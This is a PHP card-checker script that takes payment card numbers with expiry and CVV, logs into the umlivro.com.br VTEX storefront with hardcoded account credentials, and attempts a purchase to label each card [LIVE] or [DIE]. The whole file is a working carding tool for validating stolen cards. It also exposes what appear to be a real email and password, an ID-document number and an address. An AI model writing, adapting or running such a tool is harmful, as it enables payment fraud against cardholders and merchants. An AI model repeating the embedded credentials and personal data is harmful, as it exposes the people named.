<?php
// =====================================================
// ✅ CONFIGURAÇÕES UMLIVRO
// =====================================================
define('BASE_URL', 'https://loja.umlivro.com.br');
define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
define('PASSWORD', '00998877mN');
define('ACCOUNT_NAME', 'umlivro');
define('ACCOUNT_ID', '2ded749b-03a9-4660-bf2f-229a32a79583');
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36');

define('PRODUCT_SKU', '1883447');
define('PRODUCT_SELLER', 1);
define('PRODUCT_QUANTITY', 1);

define('CLIENT_FIRST_NAME', 'ALYSON');
define('CLIENT_LAST_NAME', 'bvasda');
define('CLIENT_DOCUMENT', '08471416832');
define('CLIENT_PHONE', '11999999999');

define('SHIPPING_POSTAL_CODE', '07790-515');
define('SHIPPING_CITY', 'Cajamar');
define('SHIPPING_STATE', 'SP');
define('SHIPPING_STREET', 'Rua Rita Maria de Jesus');
define('SHIPPING_NUMBER', 'ew23');
define('SHIPPING_NEIGHBORHOOD', 'Polvilho (Polvilho)');
define('SHIPPING_COMPLEMENT', '');
define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
define('SHIPPING_COUNTRY', 'BRA');

$cartao_input = trim($_POST['lista'] ?? '');

if (empty($cartao_input)) {
    echo "<span class='text-red-400'>[ERRO] Nenhum cartão recebido.</span>";
    exit;
}

$dados_cc = explode('|', $cartao_input);
if (count($dados_cc) < 4) {
    echo "<span class='text-red-400'>[FORMATO INVÁLIDO] Use: NUMERO|MES|ANO|CVV</span>";
    exit;
}

$cc_num = trim($dados_cc[0]);
$cc_mes = trim($dados_cc[1]);
$cc_ano = trim($dados_cc[2]);
$cc_cvv = trim($dados_cc[3]);

if (strlen($cc_num) < 13 || strlen($cc_cvv) < 3) {
    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão inválido: {$cc_num}</span>";
    exit;
}

$cookie_path = sys_get_temp_dir() . '/cookie_umlivro_' . uniqid() . '.txt';

function requisicao_cc($url, $post_fields = null, $headers = [], $cookie_file = 'cookie.txt', $method = 'POST') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);

    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }

    if ($post_fields !== null) {
        if ($method === 'GET') {
            curl_setopt($ch, CURLOPT_HTTPGET, true);
        } else {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($post_fields) ? json_encode($post_fields) : $post_fields);
        }
    }

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['body' => $response, 'code' => $http_code];
}

// 1. Acessa a loja para iniciar os cookies de sessão
requisicao_cc(BASE_URL, null, [], $cookie_path, 'GET');

// 2. Faz o login com as credenciais configuradas na VTEX para autenticar a sessão
$login_payload = ['email' => EMAIL, 'password' => PASSWORD];
requisicao_cc(BASE_URL . "/api/io/login", $login_payload, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);

// 3. Monta o payload do carrinho e pagamento com o cartão da vez
$payload = [
    'items' => [['id' => PRODUCT_SKU, 'quantity' => PRODUCT_QUANTITY, 'seller' => PRODUCT_SELLER]],
    'paymentData' => [
        'payments' => [[
            'paymentSystem' => '1',
            'bin' => substr($cc_num, 0, 6),
            'accountId' => ACCOUNT_ID,
            'referenceValue' => 1000,
            'card' => [
                'number' => $cc_num,
                'holderName' => CLIENT_FIRST_NAME . ' ' . CLIENT_LAST_NAME,
                'expirationMonth' => $cc_mes,
                'expirationYear' => $cc_ano,
                'cvv' => $cc_cvv
            ]
        ]]
    ]
];

$resposta = requisicao_cc(BASE_URL . "/api/checkout/pub/orderForm", $payload, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
@unlink($cookie_path);

$json = json_decode($resposta['body'], true);

$codigo = "14";
$mensagem = "Transação não autorizada";
$aprovado = false;

// Análise das mensagens e status de pagamento retornados pela VTEX
if (isset($json['paymentData']['transactions'])) {
    foreach ($json['paymentData']['transactions'] as $transaction) {
        foreach ($transaction['payments'] as $payment) {
            $status_pagamento = $payment['status'] ?? '';
            if ($status_pagamento === 'approved' || $status_pagamento === 'completed') {
                $aprovado = true;
                $codigo = "54";
                $mensagem = "Transação Aprovada com Sucesso";
                break 2;
            } else if (isset($payment['lastMessage']) && !empty($payment['lastMessage'])) {
                $mensagem = $payment['lastMessage'];
            }
        }
    }
}

if (!$aprovado && isset($json['messages']) && !empty($json['messages'])) {
    foreach ($json['messages'] as $msg) {
        if (isset($msg['text'])) {
            $mensagem = $msg['text'];
            break;
        }
    }
}

// Retorno na tela
if ($aprovado || $codigo == "54") {
    echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
} else {
    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
}
?>
